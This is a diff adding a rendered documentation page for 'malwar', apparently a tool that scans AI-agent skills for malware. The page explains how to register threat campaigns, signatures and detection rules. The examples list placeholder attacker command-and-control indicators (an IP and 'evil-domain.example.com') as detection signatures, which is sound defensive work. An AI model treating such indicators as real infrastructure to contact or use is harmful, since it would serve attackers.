+<h2 id="adding-new-campaigns">Adding New Campaigns<a class="headerlink" href="#adding-new-campaigns" title="Permanent link">&para;</a></h2>
+<h3 id="step-1-define-the-campaign">Step 1: Define the Campaign<a class="headerlink" href="#step-1-define-the-campaign" title="Permanent link">&para;</a></h3>
+<p>Add a campaign record to the database via the API or directly using SQL:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">campaigns</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="p">,</span><span class="w"> </span><span class="n">first_seen</span><span class="p">,</span><span class="w"> </span><span class="n">last_seen</span><span class="p">,</span><span class="w"> </span><span class="n">attributed_to</span><span class="p">,</span><span class="w"> </span><span class="n">iocs</span><span class="p">,</span><span class="w"> </span><span class="n">total_skills_affected</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">)</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="s1">&#39;campaign-newcampaign-001&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="s1">&#39;NewCampaign&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="s1">&#39;Description of the campaign tactics and targets&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="s1">&#39;2026-02-01&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="s1">&#39;2026-02-20&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">    </span><span class="s1">&#39;threat-actor-handle&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">    </span><span class="s1">&#39;[&quot;ioc1&quot;, &quot;ioc2&quot;, &quot;ioc3&quot;]&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">    </span><span class="mi">50</span><span class="p">,</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span><span class="s1">&#39;active&#39;</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="p">);</span>
+</code></pre></div>
+<h3 id="step-2-create-threat-signatures">Step 2: Create Threat Signatures<a class="headerlink" href="#step-2-create-threat-signatures" title="Permanent link">&para;</a></h3>
+<p>Add signatures linked to the campaign. This can be done via the API or CLI.</p>
+<p><strong>Via API:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:8000/api/v1/signatures<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-API-Key: your-key&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="s1">    &quot;name&quot;: &quot;NewCampaign C2 Server&quot;,</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="s1">    &quot;description&quot;: &quot;C2 server for NewCampaign&quot;,</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="s1">    &quot;severity&quot;: &quot;critical&quot;,</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="s1">    &quot;category&quot;: &quot;known_malware&quot;,</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="s1">    &quot;pattern_type&quot;: &quot;exact&quot;,</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="s1">    &quot;pattern_value&quot;: &quot;198.51.100.1&quot;,</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="s1">    &quot;ioc_type&quot;: &quot;ip&quot;,</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="s1">    &quot;campaign_id&quot;: &quot;campaign-newcampaign-001&quot;,</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="s1">    &quot;source&quot;: &quot;threat-intel-feed&quot;</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="s1">  }&#39;</span>
+</code></pre></div>
+<p><strong>Via CLI:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>malwar<span class="w"> </span>signature-add<span class="w"> </span>exact<span class="w"> </span><span class="s2">&quot;198.51.100.1&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>--name<span class="w"> </span><span class="s2">&quot;NewCampaign C2 Server&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>--severity<span class="w"> </span>critical<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span>--category<span class="w"> </span>known_malware<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span>--ioc-type<span class="w"> </span>ip<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">  </span>--campaign-id<span class="w"> </span>campaign-newcampaign-001<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">  </span>--source<span class="w"> </span>threat-intel-feed<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">  </span>--description<span class="w"> </span><span class="s2">&quot;C2 server for NewCampaign&quot;</span>
+</code></pre></div>
+<h3 id="step-3-add-known-publishers">Step 3: Add Known Publishers<a class="headerlink" href="#step-3-add-known-publishers" title="Permanent link">&para;</a></h3>
+<p>If the campaign has known threat actor accounts, add them to the publishers table:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">publishers</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">is_known_threat_actor</span><span class="p">,</span><span class="w"> </span><span class="n">reputation_score</span><span class="p">)</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;threat-actor-handle&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="step-4-add-hardcoded-detection-rules-optional">Step 4: Add Hardcoded Detection Rules (Optional)<a class="headerlink" href="#step-4-add-hardcoded-detection-rules-optional" title="Permanent link">&para;</a></h3>
+<p>For campaigns with distinct, high-confidence IOCs, consider adding a dedicated rule in <code>src/malwar/detectors/rule_engine/rules/known_malware.py</code>. This provides Layer 1 detection even when the database is unavailable.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nd">@rule</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="k">class</span><span class="w"> </span><span class="nc">NewCampaignIndicators</span><span class="p">(</span><span class="n">BaseRule</span><span class="p">):</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="n">rule_id</span> <span class="o">=</span> <span class="s2">&quot;MALWAR-MAL-002&quot;</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    <span class="n">title</span> <span class="o">=</span> <span class="s2">&quot;NewCampaign indicator&quot;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    <span class="n">severity</span> <span class="o">=</span> <span class="n">Severity</span><span class="o">.</span><span class="n">CRITICAL</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    <span class="n">category</span> <span class="o">=</span> <span class="n">ThreatCategory</span><span class="o">.</span><span class="n">KNOWN_MALWARE</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="n">description</span> <span class="o">=</span> <span class="s2">&quot;Detects known NewCampaign infrastructure&quot;</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="n">KNOWN_C2_IPS</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;198.51.100.1&quot;</span><span class="p">]</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="n">KNOWN_DOMAINS</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;evil-domain.example.com&quot;</span><span class="p">]</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">check</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">skill</span><span class="p">:</span> <span class="n">SkillContent</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="n">Finding</span><span class="p">]:</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>        <span class="c1"># ... pattern matching logic ...</span>
+</code></pre></div>
+<h3 id="step-5-verify-detection">Step 5: Verify Detection<a class="headerlink" href="#step-5-verify-detection" title="Permanent link">&para;</a></h3>
+<p>Scan a test skill containing the new campaign's IOCs to verify detection:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>malwar<span class="w"> </span>scan<span class="w"> </span>tests/fixtures/skills/malicious/new_campaign_sample.md
+</code></pre></div>
+<h3 id="best-practices-for-campaign-tracking">Best Practices for Campaign Tracking<a class="headerlink" href="#best-practices-for-campaign-tracking" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p><strong>Use multiple signature types</strong> -- Add signatures for IPs, domains, URLs, and author handles to maximize detection coverage.</p>
+</li>
+<li>
+<p><strong>Update <code>last_seen</code> dates</strong> -- When new campaign activity is observed, update the campaign's <code>last_seen</code> field.</p>
+</li>
+<li>
+<p><strong>Track skill counts</strong> -- Update <code>total_skills_affected</code> as new malicious skills are attributed to the campaign.</p>
+</li>
+<li>
+<p><strong>Set appropriate status</strong> -- Use <code>active</code> for ongoing campaigns, <code>inactive</code> for campaigns that have ceased, and <code>monitoring</code> for campaigns under observation.</p>
+</li>
+<li>
+<p><strong>Document attribution</strong> -- Record all known threat actor handles in <code>attributed_to</code> and as publisher records.</p>
+</li>
+<li>
+<p><strong>Regex signatures for variants</strong> -- Use <code>pattern_type: regex</code> for IOCs that have predictable variations (e.g., rotating subdomains, incremental URL paths).</p>
+</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/Ap6pack/malwar" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.expand", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
